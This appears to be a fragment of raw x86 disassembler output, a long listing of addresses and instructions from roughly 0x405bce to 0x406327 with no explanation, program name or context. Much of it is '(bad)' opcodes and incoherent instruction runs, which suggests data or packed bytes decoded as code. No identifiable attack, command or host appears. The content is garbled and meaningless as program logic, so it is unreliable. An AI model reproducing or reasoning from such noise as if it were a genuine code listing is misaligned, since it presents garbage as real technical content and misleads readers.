  405bce:	loope  0x405b87
  405bd0:	into   
  405bd1:	inc    ebp
  405bd2:	(bad)  
  405bd4:	add    esi,DWORD PTR [ebp-0x17]
  405bd7:	xlat   BYTE PTR ds:[ebx]
  405bd8:	shl    DWORD PTR ds:0x6203e851,cl
  405bde:	stc    
  405bdf:	iret   
  405be0:	sbb    edx,0x58
  405be3:	push   0xd96204
  405be8:	mov    DWORD PTR [ecx+0x798168fd],eax
  405bee:	aad    0x8
  405bf0:	out    dx,al
  405bf1:	mov    DWORD PTR ds:0x2d765671,ebp
  405bf7:	or     ecx,esp
  405bf9:	popa   
  405bfa:	(bad)  [eax]
  405bfc:	jmp    0xf146355a
  405c01:	popa   
  405c02:	fld    DWORD PTR [eax]
  405c04:	jmp    0x4b41356a
  405c09:	outs   dx,DWORD PTR ds:[esi]
  405c0a:	loope  0x405c1b
  405c0c:	(bad)  
  405c0e:	in     eax,0xf
  405c10:	mov    bh,BYTE PTR [esi+0x21]
  405c13:	adc    BYTE PTR [edi],bh
  405c15:	sub    BYTE PTR [ebp+0x450d8810],ah
  405c1b:	adc    BYTE PTR [edi],ch
  405c1d:	sbb    BYTE PTR [ebp+0x64418310],al
  405c23:	adc    BYTE PTR [edi],bl
  405c25:	add    BYTE PTR [eax],ch
  405c27:	xchg   esp,eax
  405c28:	adc    BYTE PTR [ebx],cl
  405c2a:	lea    esp,ds:0x94180f10
  405c30:	adc    BYTE PTR [ebx-0x4d],ah
  405c33:	and    DWORD PTR [eax],edx
  405c35:	mov    edi,0xdc10992b
  405c3a:	mov    cl,0x31
  405c3c:	adc    BYTE PTR [edi+0x48d0941b],ch
  405c42:	jp     0x405c81
  405c44:	mov    al,0x9f
  405c46:	stos   DWORD PTR es:[edi],eax
  405c47:	xchg   ebx,eax
  405c48:	lock cmp al,0x4c
  405c4b:	jecxz  0x405c5c
  405c4d:	(bad)  
  405c4e:	fwait
  405c4f:	xchg   ebx,eax
  405c50:	adc    BYTE PTR [edi+esi*1-0x5440afc7],bl
  405c57:	test   BYTE PTR [eax],dl
  405c59:	cwde   
  405c5a:	and    ch,dl
  405c5c:	imul   ebx,DWORD PTR [ebx-0x26ffef6c]
  405c63:	ror    DWORD PTR [ebx],0x21
  405c66:	std    
  405c67:	xchg   edx,eax
  405c68:	adc    DWORD PTR ss:[ecx-0x22ee5148],edx
  405c6f:	xchg   edx,eax
  405c70:	(bad)  
  405c71:	adc    DWORD PTR ds:0x3d11bb42,ebp
  405c77:	(bad)  
  405c78:	adc    DWORD PTR ss:[ebx+0x3d113958],ebp
  405c7f:	nop
  405c80:	adc    DWORD PTR ss:[ecx+0x3],ebx
  405c84:	cmp    DWORD PTR [ecx],edx
  405c86:	jge    0x405c17
  405c88:	adc    DWORD PTR ss:[eax],eax
  405c8b:	push   0xffffffee
  405c8d:	cmp    BYTE PTR [ecx],dl
  405c8f:	pop    ebp
  405c90:	xchg   edx,eax
  405c91:	adc    DWORD PTR ss:[ecx],eax
  405c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c95:	dec    esi
  405c96:	adc    DWORD PTR [ebp-0x71],edi
  405c99:	(bad)  
  405c9a:	adc    DWORD PTR [ebx+0x27],ebp
  405c9d:	jge    0x405cb0
  405c9f:	jge    0x405c30
  405ca1:	(bad)  
  405ca2:	adc    DWORD PTR [ebx-0x41],ebx
  405ca5:	outs   dx,BYTE PTR ds:[esi]
  405ca6:	adc    DWORD PTR [ebp-0x71],edi
  405ca9:	(bad)  
  405caa:	adc    esp,edx
  405cac:	je     0x405ce7
  405cae:	adc    DWORD PTR [ebp-0x71],ebx
  405cb1:	(bad)  
  405cb2:	adc    DWORD PTR [edi-0x42eeb54e],esp
  405cb8:	xchg   ecx,eax
  405cb9:	ret    0xa11
  405cbc:	xlat   BYTE PTR ds:[ebx]
  405cbd:	inc    DWORD PTR [eax]
  405cbf:	cli    
  405cc0:	(bad)  
  405cc1:	inc    DWORD PTR [eax]
  405cc3:	cli    
  405cc4:	(bad)  
  405cc5:	inc    DWORD PTR [eax]
  405cc7:	retf   0xffd6
  405cca:	add    cl,al
  405ccc:	(bad)  
  405ccd:	inc    DWORD PTR [eax]
  405ccf:	mov    edx,0xba00ffd6
  405cd4:	fcos   
  405cd6:	add    cl,cl
  405cd8:	fld    DWORD PTR [edx]
  405cda:	add    ah,BYTE PTR [edx-0x50]
  405cdd:	add    BYTE PTR [edx],al
  405cdf:	pusha  
  405ce0:	mov    al,0xfe
  405ce2:	add    ebx,DWORD PTR [esi-0x50]
  405ce5:	add    BYTE PTR [edx],al
  405ce7:	data16 mov al,0x0
  405cea:	add    ah,BYTE PTR [eax-0x50]
  405ced:	add    BYTE PTR [eax+eax*1],al
  405cf0:	data16 mov dh,0x0
  405cf3:	add    ah,BYTE PTR [eax-0x52]
  405cf6:	add    BYTE PTR [edx],al
  405cf8:	pusha  
  405cf9:	mov    al,0x0
  405cfb:	add    bl,BYTE PTR [esi-0x52]
  405cfe:	inc    BYTE PTR [ecx]
  405d00:	pusha  
  405d01:	mov    al,0xfe
  405d03:	add    BYTE PTR [ebx-0x4f],ah
  405d06:	add    eax,DWORD PTR [ecx]
  405d08:	arpl   WORD PTR [ebp-0x4f7cdf01],si
  405d0e:	add    DWORD PTR [ebx],eax
  405d10:	fs scas eax,DWORD PTR es:[edi]
  405d12:	add    DWORD PTR [ebx],eax
  405d14:	popa   
  405d15:	scas   eax,DWORD PTR es:[edi]
  405d16:	add    DWORD PTR [ebx],eax
  405d18:	popa   
  405d19:	scas   eax,DWORD PTR es:[edi]
  405d1a:	add    DWORD PTR [ebx],eax
  405d1c:	pop    edi
  405d1d:	scas   eax,DWORD PTR es:[edi]
  405d1e:	add    DWORD PTR ds:0x301af61,eax
  405d24:	popa   
  405d25:	mov    cl,0x3
  405d27:	add    DWORD PTR [ecx-0x4f],esp
  405d2a:	add    DWORD PTR [ecx],eax
  405d2c:	popa   
  405d2d:	mov    cl,0x1
  405d2f:	add    DWORD PTR [ebx-0x4f],esp
  405d32:	add    DWORD PTR [ecx],eax
  405d34:	bound  esp,QWORD PTR [ecx+0x18620802]
  405d3a:	jge    0x405d7c
  405d3c:	bound  ecx,QWORD PTR [edx+eax*1]
  405d3f:	or     ah,BYTE PTR [edx+0x14]
  405d42:	jge    0x405d84
  405d44:	bound  edx,QWORD PTR [edx+0x2]
  405d47:	add    al,0x62
  405d49:	loopne 0x405dc7
  405d4b:	inc    eax
  405d4c:	(bad)  
  405d4d:	int    0x4
  405d4f:	push   cs
  405d50:	(bad)  
  405d51:	call   0x62409dd2
  405d56:	fldz   
  405d58:	add    ebp,DWORD PTR [esi-0x27]
  405d5b:	out    dx,eax
  405d5c:	mov    esp,DWORD PTR [edx]
  405d5e:	fnstcw WORD PTR [ecx-0x1026adfd]
  405d64:	mov    esp,DWORD PTR [edx]
  405d66:	fst    DWORD PTR [ebx]
  405d68:	add    ebp,DWORD PTR [ebp-0x27]
  405d6b:	retf   
  405d6c:	mov    esp,DWORD PTR [edx]
  405d6e:	fldenv [ebp-0x54268cfd]
  405d74:	mov    esp,DWORD PTR [edx]
  405d76:	fxch   st(5)
  405d78:	add    al,0x65
  405d7a:	fnstenv [edi]
  405d7c:	jl     0x405da0
  405d7e:	fptan  
  405d80:	add    esp,DWORD PTR [eax-0x27]
  405d83:	das    
  405d84:	jl     0x405da8
  405d86:	fldpi  
  405d88:	add    esp,DWORD PTR [esi-0x27]
  405d8b:	sbb    edi,DWORD PTR [edx+eiz*4-0x27]
  405d8f:	inc    DWORD PTR [ebx]
  405d91:	jae    0x405d6c
  405d93:	inc    ebx
  405d94:	jl     0x405d38
  405d96:	fstp   DWORD PTR [ebp+0x1fd96f04]
  405d9c:	jl     0x405d40
  405d9e:	fld    st(3)
  405da0:	add    esp,DWORD PTR [edi-0x27]
  405da3:	pop    edi
  405da4:	jl     0x405d48
  405da6:	fst    DWORD PTR [edi]
  405da8:	add    al,0x43
  405daa:	fst    DWORD PTR [edi+0x7c]
  405dad:	mov    ds:0x5a03e4d9,al
  405db2:	fnstenv [ebx]
  405db4:	jl     0x405d58
  405db6:	fnstenv [ebx+eax*1+0x27d96500]
  405dbd:	jl     0x405d61
  405dbf:	fstp   DWORD PTR [edx+0x4]
  405dc2:	data16 fstp DWORD PTR [edi]
  405dc5:	jl     0x405d69
  405dc7:	fstp   DWORD PTR [eax+0x17d96403]
  405dcd:	jl     0x405df1
  405dcf:	fld    DWORD PTR [eax]
  405dd1:	and    DWORD PTR [esi-0x2f],esp
  405dd4:	add    BYTE PTR [ecx],dl
  405dd6:	inc    esi
  405dd7:	sbb    DWORD PTR [ecx],eax
  405dd9:	jl     0x405e41
  405ddb:	rol    BYTE PTR [eax],cl
  405ddd:	add    eax,0xd1011936
  405de2:	popa   
  405de3:	les    eax,FWORD PTR [eax]
  405de5:	std    
  405de6:	sub    DWORD PTR [ecx],ebx
  405de8:	add    esi,edx
  405dea:	popa   
  405deb:	ret    
  405dec:	add    ch,ah
  405dee:	push   ss
  405def:	sbb    DWORD PTR [ecx],eax
  405df1:	(bad)  
  405df2:	popa   
  405df3:	rol    BYTE PTR [eax],cl
  405df5:	int    0x6
  405df7:	sbb    DWORD PTR [ecx],eax
  405df9:	cli    
  405dfa:	popa   
  405dfb:	iret   
  405dfc:	add    BYTE PTR ds:0x830118f7,al
  405e02:	popa   
  405e03:	aam    0x0
  405e05:	sbb    edi,esp
  405e07:	sbb    BYTE PTR [ecx],al
  405e09:	and    BYTE PTR [ecx-0x21],0x0
  405e0d:	add    edi,edx
  405e0f:	sbb    DWORD PTR [ecx],eax
  405e11:	inc    eax
  405e12:	data16 loop 0x405e15
  405e15:	sub    edi,eax
  405e17:	sbb    DWORD PTR [ecx],eax
  405e19:	xlat   BYTE PTR ds:[ebx]
  405e1a:	popa   
  405e1b:	jmp    0xb7408b20
  405e20:	sbb    DWORD PTR [ecx],eax
  405e22:	imul   esp,DWORD PTR [ecx-0x1f],0x19a70900
  405e29:	add    DWORD PTR [eax],eax
  405e2b:	data16 loopne 0x405e2e
  405e2e:	or     eax,0xb1011997
  405e33:	popa   
  405e34:	loopne 0x405e36
  405e36:	cmc    
  405e37:	xchg   BYTE PTR [ecx],bl
  405e39:	add    eax,ebp
  405e3b:	popa   
  405e3c:	loope  0x405e3e
  405e3e:	fnsave [esi+0x19]
  405e41:	add    DWORD PTR [ebp+0x6100ee61],ecx
  405e47:	sbb    WORD PTR [ecx],ax
  405e4a:	add    BYTE PTR [ebx-0x14fff624],bh
  405e50:	adc    eax,0xdcaa0041
  405e55:	or     DWORD PTR [eax],eax
  405e57:	inc    edi
  405e58:	adc    eax,0xdca50041
  405e5d:	adc    al,BYTE PTR [eax]
  405e5f:	inc    ebx
  405e60:	adc    eax,0xdcf60041
  405e65:	pop    es
  405e66:	add    BYTE PTR [edi+0x15],al
  405e69:	inc    ecx
  405e6a:	add    bl,bl
  405e6c:	fmul   QWORD PTR [ecx]
  405e6e:	add    BYTE PTR [ebx+0x15],al
  405e71:	inc    ecx
  405e72:	add    bl,dh
  405e74:	fmul   QWORD PTR [ecx]
  405e76:	add    BYTE PTR [edi+0x15],bl
  405e79:	inc    ecx
  405e7a:	add    BYTE PTR [edx-0x64ffee23],ah
  405e80:	adc    al,0x41
  405e82:	add    BYTE PTR [eax],al
  405e84:	cmp    eax,0x7f0010dd
  405e89:	push   ss
  405e8a:	inc    ecx
  405e8b:	add    BYTE PTR [edx],dl
  405e8d:	fst    QWORD PTR [eax]
  405e8f:	add    BYTE PTR [ebx+0x16],al
  405e92:	inc    ecx
  405e93:	add    ah,bh
  405e95:	fcom   QWORD PTR [edx]
  405e97:	add    BYTE PTR [edi+0x16],al
  405e9a:	inc    ecx
  405e9b:	add    BYTE PTR [edi-0x74ffed23],bh
  405ea1:	pop    ss
  405ea2:	inc    ecx
  405ea3:	add    BYTE PTR [ecx],dl
  405ea5:	fmul   QWORD PTR [edi]
  405ea7:	add    BYTE PTR [edi+0x17],ch
  405eaa:	inc    ecx
  405eab:	add    BYTE PTR [esi],ch
  405ead:	fcom   QWORD PTR [eax]
  405eaf:	add    BYTE PTR [ebx+0x17],dh
  405eb2:	inc    ecx
  405eb3:	add    BYTE PTR [edx-0x23],dl
  405eb6:	adc    DWORD PTR [eax],eax
  405eb8:	not    DWORD PTR ds:0xdcdf0041
  405ebe:	adc    DWORD PTR [eax],eax
  405ec0:	jnp    0x405ed9
  405ec2:	inc    ecx
  405ec3:	add    BYTE PTR [edx-0x73],ah
  405ec6:	add    bl,BYTE PTR [edx]
  405ec8:	bound  ebx,QWORD PTR [esi+0x7f]
  405ecb:	inc    eax
  405ecc:	bound  edx,QWORD PTR [edi+0x2]
  405ecf:	push   cs
  405ed0:	(bad)  
  405ed5:	cld    
  405ed6:	add    al,0xe
  405ed8:	(bad)  
  405edd:	aas    
  405ede:	add    dl,BYTE PTR [edx+eiz*2]
  405ee1:	loop   0x405f61
  405ee3:	inc    eax
  405ee4:	(bad)  
  405ee5:	lds    eax,FWORD PTR [esp+edx*1]
  405ee8:	add    BYTE PTR [edx-0x16],ah
  405eeb:	jle    0x405f2d
  405eed:	bound  eax,QWORD PTR [esi+0x2]
  405ef0:	adc    ah,BYTE PTR [edx-0x4e]
  405ef3:	jge    0x405f35
  405ef5:	bound  ecx,QWORD PTR [edi]
  405ef7:	add    dl,BYTE PTR [esi]
  405ef9:	bound  ebx,QWORD PTR [esi+0x7962407d]
  405eff:	add    dl,BYTE PTR [esi]
  405f01:	(bad)  
  405f02:	idiv   BYTE PTR [ebx+0x40]
  405f05:	(bad)  
  405f06:	enter  0x1504,0x62
  405f0a:	into   
  405f0b:	jnp    0x405f4d
  405f0d:	bound  edi,QWORD PTR ds:0x24623002
  405f13:	jl     0x405f55
  405f15:	(bad)  
  405f16:	out    0x4,eax
  405f18:	pop    es
  405f19:	bound  esp,QWORD PTR [eax+0x7d]
  405f1c:	inc    eax
  405f1d:	bound  eax,QWORD PTR [ecx]
  405f1f:	add    cl,BYTE PTR [ecx]
  405f21:	bound  ebp,QWORD PTR [eax]
  405f23:	jge    0x405f65
  405f25:	(bad)
  405f2a:	sub    al,0x7d
  405f2c:	inc    eax
  405f2d:	bound  edx,QWORD PTR [ecx]
  405f2f:	add    dh,BYTE PTR [edx]
  405f31:	bound  eax,QWORD PTR [eax+0x7d]
  405f34:	inc    eax
  405f35:	bound  ecx,QWORD PTR ds:0xc620602
  405f3b:	jge    0x405f7d
  405f3d:	(bad)  
  405f3e:	(bad)  
  405f40:	add    esp,DWORD PTR [esi-0x27]
  405f43:	pop    ebx
  405f44:	jl     0x405ee8
  405f46:	fnstcw WORD PTR [ebx]
  405f48:	add    ecx,DWORD PTR [esi-0x27]
  405f4b:	fstp   TBYTE PTR [edi+0x0]
  405f4e:	and    bl,cl
  405f50:	add    esp,DWORD PTR ss:[ecx+ebx*8+0x3]
  405f55:	and    BYTE PTR [edx],0xd9
  405f58:	mov    DWORD PTR [ebx],0x7ff3d961
  405f5e:	and    bl,cl
  405f60:	cmp    al,BYTE PTR [ebx]
  405f62:	pop    esi
  405f63:	(bad)  
  405f65:	jg     0x405f89
  405f67:	fxch   st(1)
  405f69:	add    ebx,DWORD PTR [esi-0x27]
  405f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f6d:	jg     0x405f91
  405f6f:	fnstcw WORD PTR [edi-0x5026a0fd]
  405f75:	jg     0x405f99
  405f77:	(bad)  [ebx+0x3]
  405f7a:	pop    ebx
  405f7b:	fst    DWORD PTR [edi+0x3ed9227f]
  405f81:	add    al,0x69
  405f83:	fnstcw WORD PTR [ebx]
  405f85:	and    BYTE PTR [edx],0xd9
  405f88:	jmp    0x4019bc90
  405f8d:	and    BYTE PTR [edx+0x5e047bd9],0xd9
  405f94:	aaa    
  405f95:	and    BYTE PTR [edx+0x60043cd9],0xd9
  405f9c:	das    
  405f9d:	and    BYTE PTR [edx+0x5e047dd9],0xd9
  405fa4:	sbb    eax,DWORD PTR [eax+0x4a0d9a2]
  405faa:	dec    esi
  405fab:	fldenv [ebx-0x80]
  405fae:	mov    ds:0x3d1d9,al
  405fb3:	push   edi
  405fb4:	fstp   DWORD PTR [ebx-0x80]
  405fb7:	mov    ds:0x61b700d9,al
  405fbc:	fadd   QWORD PTR [eax]
  405fbe:	(bad)  
  405fbf:	loop   0x405fd9
  405fc1:	add    DWORD PTR [edi],esp
  405fc3:	pop    esi
  405fc4:	mov    BYTE PTR [eax],0x45
  405fc7:	loop   0x405fe1
  405fc9:	add    DWORD PTR [ebp+0x5e],ebp
  405fcc:	fadd   QWORD PTR [eax]
  405fce:	cmc    
  405fcf:	loop   0x405fe9
  405fd1:	add    edi,ebx
  405fd3:	popa   
  405fd4:	fadd   QWORD PTR [eax]
  405fd6:	fucom  st(2)
  405fd8:	sbb    BYTE PTR [ecx],al
  405fda:	jb     0x40603a
  405fdc:	out    0x0,eax
  405fde:	add    eax,0x360118e3
  405fe3:	pop    esi
  405fe4:	loopne 0x405fe6
  405fe6:	aad    0xe2
  405fe8:	sbb    BYTE PTR [ecx],al
  405fea:	dec    esp
  405feb:	pop    esi
  405fec:	fild   WORD PTR [eax]
  405fee:	test   eax,0x340118e2
  405ff3:	pop    esi
  405ff4:	fadd   QWORD PTR [eax]
  405ff6:	mov    cl,0xe2
  405ff8:	sbb    BYTE PTR [ecx],al
  405ffa:	into   
  405ffb:	popa   
  405ffc:	fiadd  DWORD PTR [eax]
  405ffe:	cdq    
  405fff:	loop   0x406019
  406001:	add    DWORD PTR [ebx+0x3500ea61],ecx
  406007:	jecxz  0x406021
  406009:	add    DWORD PTR [ecx+0x5e],edx
  40600c:	aam    0x0
  40600e:	inc    ecx
  40600f:	jecxz  0x40602a
  406011:	add    DWORD PTR [esi+ebx*2],ebp
  406014:	fild   WORD PTR [eax]
  406016:	xchg   ecx,eax
  406017:	add    dl,ah
  406019:	sbb    DWORD PTR [ecx],eax
  40601b:	imul   esp,DWORD PTR [ecx-0x25],0x19e27500
  406022:	add    DWORD PTR [ebp+0x5d00db61],edi
  406028:	loop   0x406043
  40602a:	add    esp,ecx
  40602c:	popa   
  40602d:	loop   0x40602f
  40602f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406030:	loop   0x40604b
  406032:	add    DWORD PTR [eax],eax
  406034:	(bad)  
  406035:	fadd   DWORD PTR [eax+eax*1]
  406038:	jmp    0x406093
  40603a:	inc    ecx
  40603b:	add    BYTE PTR [ebx*8+0x59d30008],dh
  406042:	inc    ecx
  406043:	add    dh,bl
  406045:	fmul   DWORD PTR ds:0x4159a700
  40604b:	add    BYTE PTR [edi+0x370005d8],dl
  406051:	pop    ecx
  406052:	inc    ecx
  406053:	add    BYTE PTR [ecx-0x28],al
  406056:	or     al,0x0
  406058:	(bad)  
  406059:	pop    ecx
  40605a:	inc    ecx
  40605b:	add    al,ch
  40605d:	fadd   DWORD PTR [edi]
  40605f:	add    BYTE PTR [edi-0x1affbeea],bl
  406065:	fmul   DWORD PTR [edx]
  406067:	add    BYTE PTR [ebx+0x13],ah
  40606a:	inc    ecx
  40606b:	add    BYTE PTR [esi],dh
  40606d:	fadd   DWORD PTR [eax+eax*1]
  406070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406071:	push   ss
  406072:	inc    ecx
  406073:	add    bl,cl
  406075:	fadd   DWORD PTR [esi+0x1]
  406078:	retf   
  406079:	push   ss
  40607a:	inc    ecx
  40607b:	add    BYTE PTR [eax],al
  40607d:	jo     0x406057
  40607f:	push   ebx
  406080:	add    bl,dh
  406082:	adc    al,BYTE PTR [ecx+0x0]
  406085:	imul   ebx,ebp,0x16ab0027
  40608b:	inc    ecx
  40608c:	add    BYTE PTR [ecx],dh
  40608e:	fisttp QWORD PTR [edx]
  406090:	add    BYTE PTR [edi],ch
  406092:	push   ss
  406093:	inc    ecx
  406094:	add    BYTE PTR [edi-0x28],dl
  406097:	xor    DWORD PTR [eax],eax
  406099:	push   ebx
  40609a:	push   0xddb40041
  40609f:	add    eax,0x41684f00
  4060a4:	add    BYTE PTR [edx-0x78fff823],bh
  4060aa:	ins    DWORD PTR es:[edi],dx
  4060ab:	inc    ecx
  4060ac:	add    BYTE PTR [edx+0xf],ah
  4060af:	add    eax,0x94d2622c
  4060b4:	inc    eax
  4060b5:	(bad)  
  4060b6:	cmc    
  4060b7:	add    al,0xc
  4060b9:	bound  eax,QWORD PTR [edx]
  4060bb:	xchg   ebp,eax
  4060bc:	inc    eax
  4060bd:	bound  ebp,QWORD PTR [ecx]
  4060bf:	add    eax,0x95326244
  4060c4:	inc    eax
  4060c5:	bound  eax,QWORD PTR ds:0x1a620405
  4060cb:	xchg   ebp,eax
  4060cc:	inc    eax
  4060cd:	bound  edx,QWORD PTR ds:0x22620405
  4060d3:	xchg   ebp,eax
  4060d4:	inc    eax
  4060d5:	bound  ebp,QWORD PTR [ebx]
  4060d7:	add    eax,0x952a620a
  4060dc:	inc    eax
  4060dd:	bound  ebx,QWORD PTR [ebp+0x62000602]
  4060e3:	into   
  4060e4:	xchg   esp,eax
  4060e5:	inc    eax
  4060e6:	(bad)  
  4060e7:	rol    BYTE PTR [esi+eiz*1],1
  4060ea:	(bad)  
  4060eb:	not    BYTE PTR [eax+eax*2+0x504cf62]
  4060f2:	bound  ebx,QWORD PTR [esi+0x2f624093]
  4060f8:	add    eax,0x93a66207
  4060fd:	inc    eax
  4060fe:	bound  edx,QWORD PTR [esi+0x4e620302]
  406104:	xchg   ebx,eax
  406105:	inc    eax
  406106:	(bad)  
  406107:	stc    
  406108:	add    al,0x17
  40610a:	bound  edi,QWORD PTR [edx+0x4a624091]
  406110:	add    cl,BYTE PTR [edi]
  406112:	(bad)  
  406113:	rcl    BYTE PTR [ecx+0x4d76240],1
  406119:	add    eax,0x40922062
  40611e:	bound  ecx,QWORD PTR [ecx+0x18621402]
  406124:	xchg   edx,eax
  406125:	inc    eax
  406126:	(bad)  
  406127:	fxch   st(0)
  406129:	add    ecx,DWORD PTR [ecx+ebx*8+0x67]
  40612d:	xchg   edx,eax
  40612e:	mov    ds:0x650406d9,al
  406133:	fld    DWORD PTR [edi-0x6e]
  406136:	mov    ds:0x720409d9,al
  40613b:	(bad)  [edi-0x6e]
  40613e:	mov    ds:0x64035cd9,al
  406143:	fldcw  WORD PTR [ebx]
  406145:	xchg   edx,eax
  406146:	add    BYTE PTR [edx+0x6103c5d9],ah
  40614c:	fldenv [ebx]
  40614e:	xchg   edx,eax
  40614f:	mov    ds:0x8d032ad9,al
  406154:	fstp   DWORD PTR [edi]
  406156:	xchg   edx,eax
  406157:	and    bl,cl
  406159:	mov    bl,0x3
  40615b:	jne    0x406136
  40615d:	aas    
  40615e:	xchg   edx,eax
  40615f:	and    bl,cl
  406161:	dec    edi
  406162:	add    ebx,DWORD PTR [eax-0x27]
  406165:	xlat   BYTE PTR ds:[ebx]
  406166:	xchg   ecx,eax
  406167:	and    bl,cl
  406169:	push   ebp
  40616a:	add    ebx,DWORD PTR [ebp-0x27]
  40616d:	retf   
  40616e:	xchg   ecx,eax
  40616f:	and    bl,cl
  406171:	rol    DWORD PTR [ebx],0x76
  406174:	fxch   st(3)
  406176:	xchg   ecx,eax
  406177:	and    bl,cl
  406179:	dec    esp
  40617a:	add    ebp,DWORD PTR [ebp-0x27]
  40617d:	xchg   ebx,eax
  40617e:	xchg   ecx,eax
  40617f:	and    bl,cl
  406181:	pop    DWORD PTR [ebx]
  406183:	inc    esi
  406184:	fnstenv [ebx-0x6f]
  406187:	and    bl,cl
  406189:	cmp    eax,0x7bd95804
  40618e:	xchg   esi,eax
  40618f:	and    bl,cl
  406191:	inc    edi
  406192:	add    al,0x66
  406194:	fnstcw WORD PTR [edi-0x6a]
  406197:	mov    ds:0x6604a7d9,al
  40619c:	fnstenv [edi-0x6a]
  40619f:	mov    ds:0x663b00d9,al
  4061a4:	in     eax,0x0
  4061a6:	jno    0x406174
  4061a8:	sbb    BYTE PTR [ecx],al
  4061aa:	in     eax,dx
  4061ab:	add    BYTE PTR [ecx-0x18],ah
  4061ae:	add    BYTE PTR [ecx-0x33fee734],dh
  4061b4:	popa   
  4061b5:	jecxz  0x4061b7
  4061b7:	lods   eax,DWORD PTR ds:[esi]
  4061b8:	in     al,dx
  4061b9:	sbb    BYTE PTR [ecx],al
  4061bb:	(bad)  
  4061bc:	popa   
  4061bd:	in     eax,0x0
  4061bf:	(bad)  
  4061c0:	in     al,dx
  4061c1:	sbb    BYTE PTR [ecx],al
  4061c3:	scas   al,BYTE PTR es:[edi]
  4061c4:	out    0x0,ax
  4061c7:	ins    DWORD PTR es:[edi],dx
  4061c8:	int3   
  4061c9:	sbb    BYTE PTR [ecx],al
  4061cb:	adc    al,0x66
  4061cd:	repz add cl,bh
  4061d0:	int3   
  4061d1:	sbb    BYTE PTR [ecx],al
  4061d3:	(bad)  
  4061d4:	popa   
  4061d5:	enter  0x1900,0xed
  4061d9:	sbb    BYTE PTR [ecx],al
  4061db:	(bad)  
  4061dc:	data16 loopne 0x4061df
  4061df:	(bad)
  4061e2:	add    DWORD PTR [esi+eiz*2],ebx
  4061e5:	in     eax,0x0
  4061e7:	mov    ecx,0x8c0118cc
  4061ec:	popa   
  4061ed:	in     eax,0x0
  4061ef:	imul   ecx,ebp,0x66310118
  4061f5:	fiadd  DWORD PTR [eax]
  4061f7:	jns    0x4061e6
  4061f9:	sbb    BYTE PTR [ecx],al
  4061fb:	and    DWORD PTR [ecx-0x13],0x18ed6100
  406202:	add    ebx,ebx
  406204:	popa   
  406205:	fld    QWORD PTR [eax]
  406207:	cmp    ebp,ecx
  406209:	sbb    BYTE PTR [ecx],al
  40620b:	mov    ds:0xa100dd61,eax
  406210:	add    ah,cl
  406212:	sbb    BYTE PTR [ecx],al
  406214:	sbb    DWORD PTR [esi-0x2b],esp
  406217:	add    BYTE PTR [ecx+0x119ec],ch
  40621d:	adc    ch,0x6
  406220:	add    BYTE PTR [ebx],dl
  406222:	push   0xd55d0041
  406227:	or     al,0x0
  406229:	(bad)  [edi+0x41]
  40622c:	add    BYTE PTR ds:0xdb0004dd,cl
  406232:	addr16 inc ecx
  406234:	add    BYTE PTR [ecx-0x1cffe124],dh
  40623a:	addr16 inc ecx
  40623c:	add    dl,bl
  40623e:	fadd   QWORD PTR ds:0x41611300
  406244:	add    al,dl
  406246:	fmul   QWORD PTR ds:0x41611b00
  40624c:	add    BYTE PTR [ecx],ch
  40624e:	fadd   QWORD PTR [esi]
  406250:	add    BYTE PTR [ebx+0x69],bl
  406253:	inc    ecx
  406254:	add    BYTE PTR [ecx-0x24],dl
  406257:	add    al,0x0
  406259:	arpl   WORD PTR [ecx+0x41],bp
  40625c:	add    BYTE PTR [ebx],dh
  40625e:	fadd   QWORD PTR [esi]
  406260:	add    bl,cl
  406262:	pusha  
  406263:	inc    ecx
  406264:	add    BYTE PTR [esi-0x4cfff824],bl
  40626a:	pusha  
  40626b:	inc    ecx
  40626c:	add    BYTE PTR [ebx],cl
  40626e:	fmul   QWORD PTR [eax+eax*1]
  406271:	jmp    DWORD PTR [eax+0x41]
  406274:	add    BYTE PTR [eax],al
  406276:	(bad)  
  406277:	fmul   QWORD PTR [eax]
  406279:	add    bh,cl
  40627b:	pusha  
  40627c:	inc    ecx
  40627d:	add    BYTE PTR [esp+ebx*8+0x60db000c],dl
  406284:	inc    ecx
  406285:	add    BYTE PTR [ebp-0x25],dh
  406288:	or     DWORD PTR [eax],eax
  40628a:	sti    
  40628b:	pop    edi
  40628c:	inc    ecx
  40628d:	add    BYTE PTR [eax+0x70007d5],ah
  406293:	imul   eax,DWORD PTR [ecx+0x0],0xd052e62
  40629a:	(bad)  
  40629b:	cli    
  40629c:	nop
  40629d:	inc    eax
  40629e:	bound  edi,QWORD PTR [edi]
  4062a0:	add    eax,0x90fa620a
  4062a5:	inc    eax
  4062a6:	bound  edi,QWORD PTR [edi+0x56620d04]
  4062ac:	xchg   ecx,eax
  4062ad:	inc    eax
  4062ae:	bound  ebx,QWORD PTR [edi]
  4062b0:	add    eax,0x91266216
  4062b5:	inc    eax
  4062b6:	bound  edx,QWORD PTR [ebx]
  4062b8:	add    eax,0x916e6215
  4062bd:	inc    eax
  4062be:	bound  ebp,QWORD PTR [ebx+0x56621402]
  4062c4:	xchg   ecx,eax
  4062c5:	inc    eax
  4062c6:	bound  edi,QWORD PTR [edx-0x19df0fc]
  4062cc:	nop
  4062cd:	inc    eax
  4062ce:	bound  edx,QWORD PTR [eax]
  4062d0:	add    eax,0x8f7e620c
  4062d5:	inc    eax
  4062d6:	(bad)
  4062db:	bound  edi,QWORD PTR [esi-0x71]
  4062de:	inc    eax
  4062df:	(bad)
  4062e4:	fimul  WORD PTR [ebp+0x2986240]
  4062ea:	or     al,0x62
  4062ec:	mov    cl,BYTE PTR [edi+0x2966240]
  4062f2:	adc    BYTE PTR [edx+0x4a],ah
  4062f5:	pop    DWORD PTR [eax+0x62]
  4062f8:	hlt    
  4062f9:	add    al,0x13
  4062fb:	bound  edi,QWORD PTR [esi]
  4062fd:	pop    DWORD PTR [eax+0x62]
  406300:	sub    DWORD PTR ds:0x8f12620e,eax
  406306:	inc    eax
  406307:	bound  edi,QWORD PTR [eax+0x2]
  40630a:	adc    DWORD PTR [edx+0x2],esp
  40630d:	mov    es,WORD PTR [eax+0x62]
  406310:	fst    DWORD PTR [eax+0x4]
  406313:	push   esp
  406314:	fnstenv [ebx-0x72]
  406317:	mov    ds:0x720414d9,al
  40631c:	fld    DWORD PTR [ebx-0x68265d72]
  406322:	add    esi,DWORD PTR [ebx-0x27]
  406325:	jg     0x4062b5
  406327:	mov    ds:0x4f037ed9,al
